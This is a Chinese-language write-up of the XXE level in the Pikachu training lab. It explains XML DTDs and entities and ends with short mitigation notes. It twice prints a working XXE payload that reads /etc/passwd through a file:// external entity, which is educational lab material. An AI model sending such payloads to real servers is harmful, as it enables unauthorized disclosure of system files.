# Pikachu靶场通关之XXE漏洞

## 1、XXE漏洞概述-XML外部实体注入攻击

![image-20210104113810510](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104113810510.png)

```
XXE -"xml external entity injection"
既"xml外部实体注入漏洞"。
概括一下就是"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"
也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。

具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。
现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。
以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。

本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。
```

## 2、什么是XML-可扩展标记语言

具体xml是啥可以参考[xml教程](https://www.runoob.com/xml/xml-usage.html)

XML分为三部分：XML声明、DTD文档约束（XXE漏洞出问题的地方）、文档元素

```xml
<!-- xml声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!-- 文档类型定义DTD: xxe出问题的地方-->
<!-- 1.DTD内部引用-->
<!DOCTYPE  根元素 [元素说明]>
<!-- 2.DTD外部引用-->
<!DOCTYPE 根元素名称 SYSTEM "外部DTD的URI">
<!-- 3.引用公共DTD-->
<!DOCTYPE 根元素名称 PUBLIC "DTD标志名" "公用DTD的URI">


<!-- 文档元素：真正的数据部分-->
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

![image-20210104113947422](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104113947422.png)

![image-20210104125922980](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104125922980.png)

会导致XXE漏洞的就是外部实体，下面看一个例子:引用外部实体构造读取/etc/passwd的payload

```xml
<?xml version="1.0"?> //这是一个声明
<!DOCTYPE ANY [       //DTD定义文档的类型any
	<!ENTITY f SYSTEM "file:///etc/passwd">  
//约束这里定义了一个外部实体，用system这个关键字来指定外部实体，然后用file来读取文件，把文件的内容赋值给f
]>
<x>&f;</x>  //通过读取x标签里面的f就可以读取etc/passwd里面的内容
```

![image-20210104130106302](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104130106302.png)

## 3、案列解读

php里simplexml_load_string()是将xml文档转换成SimpleXMLElement对象，php里解析xml用的是libxml库，而libxml在2.9.0版本之后是默认禁止解析xml外部实体内容的，所以后面的版本默认不会有xxe漏洞的。

![image-20210104131233108](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104131233108.png)

## 4、靶场演练

结合靶场中的源码审计，这里的意思是读取到xml文档数据就在`<pre>`标签里输出，读取不到xml或者读的xml格式错误就返回"XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?"。

![image-20210104132242986](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104132242986.png)

这里是一个正常的XML，我们来测试一下。

![image-20210104132455205](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104132455205.png)

把下面这串代码，提交，看看返回结果~

```xml
<?xml version="1.0"?> 
<!DOCTYPE note [       
	<!ENTITY hacker "Harveysn0w">  
]>
<name>&hacker;</name>
```

![image-20210104132823931](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104132823931.png)

这里直接把变量hacker里面的值返回出来了。

那么接下面我们通过DTD去定义一个外部实体。我们使用下面的payload

```xml
<?xml version="1.0"?> 
<!DOCTYPE ANY [       
	<!ENTITY f SYSTEM "file:///etc/passwd">  
]>
<x>&f;</x> 
```

![image-20210104133215276](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104133215276.png)

我们可以看到，这里直接把我们外部实体传入的文件给读取出来了。

## 5、防范措施

不要-开启了外部实体解析

需要-对传过来的数据做任何过滤



































